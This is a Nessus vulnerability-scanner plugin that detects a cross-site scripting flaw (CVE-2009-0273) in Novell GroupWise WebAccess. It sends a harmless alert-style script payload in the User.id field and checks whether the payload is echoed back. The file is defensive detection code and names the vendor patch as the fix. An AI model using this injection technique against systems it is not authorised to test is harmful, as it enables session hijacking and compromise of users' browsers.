#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(35726);
  script_version("$Revision: 1.13 $");

  script_cve_id("CVE-2009-0273");
  script_bugtraq_id(33541);
  script_osvdb_id(53983, 53984, 53985);

  script_name(english:"Novell GroupWise < 7.03HP2 / 8.0HP1 WebAccess Multiple XSS");
  script_summary(english:"Tries to inject XSS using 'User.Id' attribute");
 
  script_set_attribute( attribute:"synopsis", value:
"The remote web server contains a script that is prone to a cross-site
scripting attack."  );
  script_set_attribute( attribute:"description",  value:
"The version of Novell GroupWise WebAccess installed on the remote host
fails to sanitize user-supplied input via a POST request to the
'User.id' parameter of the '/gw/webacc' script before using it to
generate dynamic HTML output.  An attacker may be able to leverage
this issue to inject arbitrary HTML and script code into a user's
browser to be executed within the security context of the affected
site.

Note that this install is also likely affected by other cross-site
scripting and cross-site request forgery issues in its WebAccess
component as well as a buffer overflow in its GWIA component, although
Nessus has not checked for them."  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.procheckup.com/vulnerability_manager/vulnerabilities/pr08-23"
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.securityfocus.com/archive/1/500575/30/0/threaded"
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.novell.com/support/viewContent.do?externalId=7002321"
  );
  script_set_attribute( attribute:"solution",  value:
"Apply GroupWise 7.03 Hot Patch 2 (HP2) or GroupWise 8.0 Hot Patch 1
(HP1) or later."  );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(79);
 script_set_attribute(attribute:"plugin_publication_date", value: "2009/02/21");
 script_cvs_date("$Date: 2015/09/24 21:08:39 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:novell:groupwise_webaccess");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);


exploit = string('nessus"; alert(', "'", SCRIPT_NAME, "'", ');"');


# Make sure the affected script exists.
disable_cookiejar();

foreach dir (make_list("/gw", "/servlet"))
{
  url = string(dir, "/webacc");
  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(0);

  # If it does...
  if (
    string('action="', url, '"') >< res[2] &&
    (
      '<input name="User.id" ' >< res[2] ||
      '<INPUT NAME="User.id" ' >< res[2]
    )
  )
  {
    # Try our exploit.
    postdata = string("User.id=", urlencode(str:exploit));

    req = http_mk_post_req(
      port        : port,
      item        : url, 
      data        : postdata,
      add_headers : make_array(
        "Content-Type", "application/x-www-form-urlencoded"
      )
    );
    res = http_send_recv_req(port:port, req:req);
    if (isnull(res)) exit(0);

    if (
      string('var userId = "', exploit, '";') >< res[2] ||
      string('<INPUT NAME="User.id" VALUE="', exploit, '" ') >< res[2] 
    )
    {
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);

      if (report_verbosity > 0)
      {
        req_str = http_mk_buffer_from_req(req:req);
        report = string(
          "\n",
          "Nessus was able to exploit the issue using the following request :\n",
          "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
          req_str, "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
        );
        security_warning(port:port, extra:report);
      }
      else security_warning(port);
      exit(0);
    }
  }
}
